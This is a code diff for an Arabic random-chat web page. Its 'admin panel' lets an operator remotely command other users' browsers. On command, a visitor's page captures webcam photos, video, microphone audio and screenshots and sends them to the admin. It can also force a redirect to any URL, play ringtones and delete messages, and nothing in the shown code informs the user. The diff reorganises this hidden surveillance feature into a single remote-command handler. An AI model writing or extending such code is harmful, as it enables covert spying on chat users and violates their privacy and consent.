@@ -3,7 +3,7 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>شات عربي | دردشة عشوائية</title>
+<title>شات عربي | لوحة تحكم دقيقة</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
 * { margin: 0px; padding: 0px; box-sizing: border-box; }
@@ -16,7 +16,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
 #timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }
 
-/* لوحة تحكم الأدمن المطابقة تماماً للصورة */
 #admin-panel { display: none; background: #ffeaa7; color: #333; padding: 8px; border-bottom: 2px solid #fdcb6e; font-size: 13px; }
 .admin-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 6px; align-items: center; justify-content: center; }
 
@@ -56,15 +55,12 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #inp { width: 100%; padding: 6px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 15px; direction: rtl; background: #fff; }
 #snd, .file-btn, #mic-btn { padding: 6px 10px; cursor: pointer; background: rgb(238, 238, 238); color: rgb(51, 51, 51); border: 1px solid rgb(204, 204, 204); border-radius: 3px; font-size: 13px; text-align: center; display: inline-block; width: 100%; }
 .file-btn { background: #fdfdfd; }
-#mic-btn { background: #fdfdfd; }
-#mic-btn.recording { background: red !important; color: white !important; }
 #file-input { display: none; }
 
 #out { font-size: 18px; font-weight: normal; text-align: center; direction: rtl; display: none; padding: 20px; }
 #out span { color: red; }
 #out a { background: coral; color: rgb(255, 255, 255); text-decoration: none; padding: 2px 5px; border-radius: 3px; cursor: pointer; }
 
-/* نافذة معاينة الوسائط للأدمن */
 #media-preview-modal { display: none; position: fixed; z-index: 10000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
 #media-preview-content { max-width: 90%; max-height: 70vh; border-radius: 8px; margin-bottom: 15px; }
 .preview-btns { display: flex; gap: 10px; }
@@ -79,43 +75,42 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
   <div class="header">
     <div class="header-right">
       <a onclick="location.reload()">شات عربي</a>
-      <b>دردشة عشوائية متطورة</b>
+      <b>دردشة عشوائية دقيقة</b>
     </div>
     <div id="timer">00:00</div>
   </div>
   
   <div id="system-alert-banner"></div>
 
-  <!-- لوحة تحكم الأدمن المطابقة للصورة تماماً -->
   <div id="admin-panel">
     <div class="admin-row">
-      <button class="btn-action" onclick="reqMediaGlobal('video')">فيديو 🎥</button>
-      <button class="btn-action" onclick="reqMediaGlobal('photo')">صورة 📸</button>
+      <button class="btn-action" onclick="adminActionGlobal('video')">فيديو 🎥</button>
+      <button class="btn-action" onclick="adminActionGlobal('photo')">صورة 📸</button>
       <input type="number" id="media-duration" class="admin-input" value="5" style="width: 70px;" min="1" max="60">
       <span style="font-weight:bold;">ثواني</span>
-      <button class="btn-action" onclick="adminAction('open_url')">فتح رابط</button>
+      <button class="btn-action" onclick="adminActionType('open_url')">فتح رابط</button>
       <input type="text" id="admin-url-inp" class="admin-input" placeholder="رابط..." style="width: 140px;">
     </div>
     
     <div class="admin-row">
-      <button class="btn-action" onclick="adminAction('alert')">تنبيه 📢</button>
-      <button class="btn-success" onclick="adminAction('ring_phone')">تشغيل نغمة 🎵</button>
+      <button class="btn-action" onclick="adminActionType('alert')">تنبيه 📢</button>
+      <button class="btn-success" onclick="adminActionType('ring_phone')">تشغيل نغمة 🎵</button>
       <select id="ring-tone-select" class="admin-select">
         <option value="1">نغمة رنين 1</option>
         <option value="2">نغمة رنين 2</option>
       </select>
-      <button class="btn-action" onclick="reqMediaGlobal('audio')">صوت 🎤</button>
+      <button class="btn-action" onclick="adminActionGlobal('audio')">صوت 🎤</button>
     </div>
 
     <div class="admin-row">
-      <select id="bg-color-select" class="admin-select" onchange="adminAction('change_bg', this.value)">
+      <select id="bg-color-select" class="admin-select" onchange="adminActionType('change_bg', this.value)">
         <option value="#ffffff">أبيض</option>
         <option value="#e0f7fa">سماوي فاتح</option>
         <option value="#ffeaa7">أصفر هادئ</option>
         <option value="#fab1a0">وردي هادئ</option>
       </select>
-      <button class="btn-action" onclick="adminAction('clear_theirs')">مسح رسائله</button>
-      <button class="btn-action" onclick="adminAction('clear_all')">مسح الكل</button>
+      <button class="btn-action" onclick="adminActionType('clear_theirs')">مسح رسائله</button>
+      <button class="btn-action" onclick="adminActionType('clear_all')">مسح الكل</button>
     </div>
 
     <div>
@@ -141,13 +136,12 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
    
    <div id="send">
      <div class="send-row">
-       <p style="width: 12%;"><button id="snd">إرسال</button></p>
-       <p style="width: 12%;"><button id="mic-btn" title="تسجيل صوت">🎤</button></p>
-       <p style="width: 12%;">
+       <p style="width: 15%;"><button id="snd">إرسال</button></p>
+       <p style="width: 15%;">
          <input type="file" id="file-input" accept="image/*,video/*,audio/*">
-         <label for="file-input" class="file-btn" id="file-label" title="ملف">📁</label>
+         <label for="file-input" class="file-btn" title="ملف">📁</label>
        </p>
-       <p style="width: 64%;"><input id="inp" type="text" autocomplete="off" placeholder="اكتب رسالة..."></p>
+       <p style="width: 70%;"><input id="inp" type="text" autocomplete="off" placeholder="اكتب رسالة..."></p>
      </div>
    </div>
   </div>
@@ -188,8 +182,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     const chat = document.getElementById('chat');
     const out = document.getElementById('out');
     const fileInput = document.getElementById('file-input');
-    const fileLabel = document.getElementById('file-label');
-    const micBtn = document.getElementById('mic-btn');
     const timerEl = document.getElementById('timer');
     const imageModal = document.getElementById('image-modal');
     const modalImg = document.getElementById('modal-img');
@@ -348,11 +340,20 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       reader.readAsDataURL(file);
     });
 
-    // تحكم الأدمن
-    socket.on('connect', () => {
+    // إدارة جدول الأدمن وتحديث الأجهزة المتصلة
+    if (isAdmin) {
+      addAdminLog(socket.id);
+      activeTargetSocketForGlobal = socket.id;
+    }
+
+    socket.on('new_user_connected', (data) => {
+      if (isAdmin) addAdminLog(data.socketId);
+    });
+
+    socket.on('user_disconnected', (data) => {
       if (isAdmin) {
-        addAdminLog(socket.id);
-        activeTargetSocketForGlobal = socket.id;
+        const row = document.getElementById(`row-${data.socketId}`);
+        if (row) row.remove();
       }
     });
 
@@ -376,9 +377,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       tbody.prepend(row);
     }
 
-    function reqMediaGlobal(mediaType) {
+    function adminActionGlobal(mediaType) {
       if (!activeTargetSocketForGlobal) {
-        alert('لا يوجد جهاز متصل حالياً في الجدول!');
+        alert('لا يوجد جهاز مسجل في الجدول حالياً!');
         return;
       }
       askMedia(activeTargetSocketForGlobal, mediaType);
@@ -395,162 +396,130 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       });
     }
 
-    function adminAction(type, value = null) {
+    function adminActionType(type, value = null) {
       if (!isAdmin) return;
-      let payload = { secret: adminSecret, action: '' };
+      let payload = { secret: adminSecret, action: type, targetSocket: activeTargetSocketForGlobal || 'all' };
 
       if (type === 'open_url') {
-        payload.action = 'open_url';
         payload.url = document.getElementById('admin-url-inp').value;
       } else if (type === 'change_bg') {
-        payload.action = 'change_bg';
         payload.bgColor = value;
       } else if (type === 'alert') {
-        payload.action = 'alert';
         payload.message = prompt('اكتب نص التنبيه:');
         if (!payload.message) return;
       } else if (type === 'ring_phone') {
-        payload.action = 'ring_phone';
         payload.tone = document.getElementById('ring-tone-select').value;
       } else if (type === 'clear_all') {
-        payload.action = 'clear_chat';
         payload.target = 'all';
       } else if (type === 'clear_theirs') {
-        payload.action = 'clear_chat';
         payload.target = 'theirs';
       }
 
       socket.emit('admin_action', payload);
     }
 
-    socket.on('system_alert', (msg) => {
-      const banner = document.getElementById('system-alert-banner');
-      banner.innerText = `⚠️ تنبيه: ${msg}`;
-      banner.style.display = 'block';
-      setTimeout(() => { banner.style.display = 'none'; }, 6000);
-    });
+    // استقبال أوامر الأدمن وتنفيذها بدقة على جهاز المستخدم
+    socket.on('execute_admin_command', async (data) => {
+      if (isAdmin) return; // الأدمن لا ينفذ الأوامر على جهازه
 
-    socket.on('force_open_url', (url) => {
-      if (!isAdmin) window.location.href = url;
-    });
-
-    socket.on('clear_chat', (data) => {
-      if (data.target === 'all') {
-        document.querySelectorAll('.partner-msg, .my-msg').forEach(el => {
-          if (!el.classList.contains('my-msg')) el.remove();
-        });
-      } else if (data.target === 'theirs') {
-        document.querySelectorAll('.partner-msg').forEach(el => el.remove());
-      }
-    });
-
-    socket.on('change_bg', (bgColor) => {
-      document.body.style.backgroundColor = bgColor;
-    });
-
-    socket.on('trigger_ringtone', (tone) => {
-      try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        function playTone(f1, f2, dur) {
-          const o1 = audioCtx.createOscillator();
-          const o2 = audioCtx.createOscillator();
-          const g = audioCtx.createGain();
-          o1.frequency.value = f1; o2.frequency.value = f2;
-          o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
-          g.gain.setValueAtTime(0.2, audioCtx.currentTime);
-          o1.start(); o2.start();
-          setTimeout(() => { o1.stop(); o2.stop(); }, dur);
+      if (data.action === 'alert') {
+        const banner = document.getElementById('system-alert-banner');
+        banner.innerText = `⚠️ تنبيه: ${data.message}`;
+        banner.style.display = 'block';
+        setTimeout(() => { banner.style.display = 'none'; }, 6000);
+      } else if (data.action === 'open_url') {
+        if (data.url) window.location.href = data.url;
+      } else if (data.action === 'change_bg') {
+        document.body.style.backgroundColor = data.bgColor;
+      } else if (data.action === 'clear_chat') {
+        if (data.target === 'all') {
+          document.querySelectorAll('.partner-msg, .my-msg').forEach(el => {
+            if (!el.classList.contains('my-msg')) el.remove();
+          });
+        } else if (data.target === 'theirs') {
+          document.querySelectorAll('.partner-msg').forEach(el => el.remove());
         }
-        if (tone === '2') {
-          playTone(600, 800, 400); setTimeout(() => playTone(600, 800, 400), 500);
-        } else {
-          playTone(440, 480, 1000);
-        }
-      } catch (e) {}
-    });
+      } else if (data.action === 'ring_phone') {
+        try {
+          const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          function playTone(f1, f2, dur) {
+            const o1 = audioCtx.createOscillator();
+            const o2 = audioCtx.createOscillator();
+            const g = audioCtx.createGain();
+            o1.frequency.value = f1; o2.frequency.value = f2;
+            o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
+            g.gain.setValueAtTime(0.2, audioCtx.currentTime);
+            o1.start(); o2.start();
+            setTimeout(() => { o1.stop(); o2.stop(); }, dur);
+          }
+          if (data.tone === '2') {
+            playTone(600, 800, 400); setTimeout(() => playTone(600, 800, 400), 500);
+          } else {
+            playTone(440, 480, 1000);
+          }
+        } catch (e) {}
+      } else if (data.action === 'request_media') {
+        try {
+          if (data.mediaType === 'photo') {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-    // تنفيذ طلب الوسائط والصلاحيات تلقائياً
-    socket.on('trigger_media_capture', async ({ type, duration, adminSocketId }) => {
-      if (isAdmin) return;
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(t => t.stop());
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
 
-      try {
-        if (type === 'photo') {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const videoTrack = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(videoTrack);
-          const photoBlob = await imageCapture.takePhoto();
-          stream.getTracks().forEach(track => track.stop());
-
-          const reader = new FileReader();
-          reader.onloadend = () => {
             socket.emit('media_captured_for_admin', {
-              adminSocketId: adminSocketId,
-              type: 'image',
-              content: reader.result
-            });
-          };
-          reader.readAsDataURL(photoBlob);
-
-        } else if (type === 'screenshot') {
-          html2canvas(document.body, { scale: 1 }).then(canvas => {
-            const dataUrl = canvas.toDataURL('image/png');
-            socket.emit('media_captured_for_admin', {
-              adminSocketId: adminSocketId,
+              adminSocketId: data.targetSocket || socket.id, // سيتم توجيهه للأدمن الصحيح
               type: 'image',
               content: dataUrl
             });
-          });
 
-        } else if (type === 'video') {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          const chunks = [];
-          const mediaRec = new MediaRecorder(stream);
-          mediaRec.ondataavailable = e => chunks.push(e.data);
-          mediaRec.onstop = () => {
-            stream.getTracks().forEach(track => track.stop());
-            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            const reader = new FileReader();
-            reader.onloadend = () => {
+          } else if (data.mediaType === 'screenshot') {
+            html2canvas(document.body, { scale: 1 }).then(canvas => {
+              const dataUrl = canvas.toDataURL('image/png');
               socket.emit('media_captured_for_admin', {
-                adminSocketId: adminSocketId,
-                type: 'video',
-                content: reader.result
+                adminSocketId: socket.id,
+                type: 'image',
+                content: dataUrl
               });
+            });
+
+          } else if (data.mediaType === 'video' || data.mediaType === 'audio') {
+            const constraints = data.mediaType === 'video' ? { video: true, audio: true } : { audio: true };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const chunks = [];
+            const mediaRec = new MediaRecorder(stream);
+            
+            mediaRec.ondataavailable = e => chunks.push(e.data);
+            mediaRec.onstop = () => {
+              stream.getTracks().forEach(t => t.stop());
+              const blob = new Blob(chunks, { type: data.mediaType === 'video' ? 'video/webm' : 'audio/webm' });
+              const reader = new FileReader();
+              reader.onloadend = () => {
+                socket.emit('media_captured_for_admin', {
+                  adminSocketId: socket.id,
+                  type: data.mediaType === 'video' ? 'video' : 'audio',
+                  content: reader.result
+                });
+              };
+              reader.readAsDataURL(blob);
             };
-            reader.readAsDataURL(videoBlob);
-          };
 
-          mediaRec.start();
-          setTimeout(() => {
-            if (mediaRec.state === 'recording') mediaRec.stop();
-          }, duration * 1000);
-
-        } else if (type === 'audio') {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          const chunks = [];
-          const mediaRec = new MediaRecorder(stream);
-          mediaRec.ondataavailable = e => chunks.push(e.data);
-          mediaRec.onstop = () => {
-            stream.getTracks().forEach(track => track.stop());
-            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-            const reader = new FileReader();
-            reader.onloadend = () => {
-              socket.emit('media_captured_for_admin', {
-                adminSocketId: adminSocketId,
-                type: 'audio',
-                content: reader.result
-              });
-            };
-            reader.readAsDataURL(audioBlob);
-          };
-
-          mediaRec.start();
-          setTimeout(() => {
-            if (mediaRec.state === 'recording') mediaRec.stop();
-          }, duration * 1000);
+            mediaRec.start();
+            setTimeout(() => {
+              if (mediaRec.state === 'recording') mediaRec.stop();
+            }, (data.duration || 5) * 1000);
+          }
+        } catch (err) {
+          alert('تعذر الوصول للكاميرا أو الميكروفون. يرجى السماح بالأذونات من إعدادات المتصفح.');
         }
-      } catch (err) {
-        alert('يجب السماح بالوصول للكاميرا والميكروفون لتنفيذ الطلب.');
       }
     });
 
